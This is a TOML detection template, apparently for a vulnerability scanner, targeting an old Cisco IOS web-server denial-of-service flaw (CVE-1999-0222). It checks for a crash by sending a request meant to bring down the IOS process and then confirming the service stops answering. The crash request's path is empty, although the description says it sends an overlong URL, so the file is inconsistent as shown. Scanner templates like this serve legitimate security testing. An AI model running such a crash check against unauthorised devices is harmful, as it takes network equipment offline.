[info]
id = "POC-AVE-1999-0023"
name = "Cisco IOS Web服务器超长URL拒绝服务检测 PoC"
author = "AVE"
severity = "medium"
tags = ["cisco", "ios", "dos", "denial-of-service"]
description = "检测 Cisco IOS Web服务器超长URL拒绝服务漏洞（CVE-1999-0222），发送超长HTTP请求导致IOS进程崩溃。"
vuln_id = ["CVE-1999-0222", "AVE-1999-0023"]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/"

[[poc.requests.matchers]]
type = "status"
status = [200, 401, 403]
expect = true

[[poc.requests]]
method = "GET"
path = ""

[[poc.requests.matchers]]
type = "status"
status = [200, 400, 401, 403, 500]
expect = false

[[poc.requests]]
method = "GET"
path = "/"

[[poc.requests.matchers]]
type = "status"
status = [200, 401, 403]
expect = false
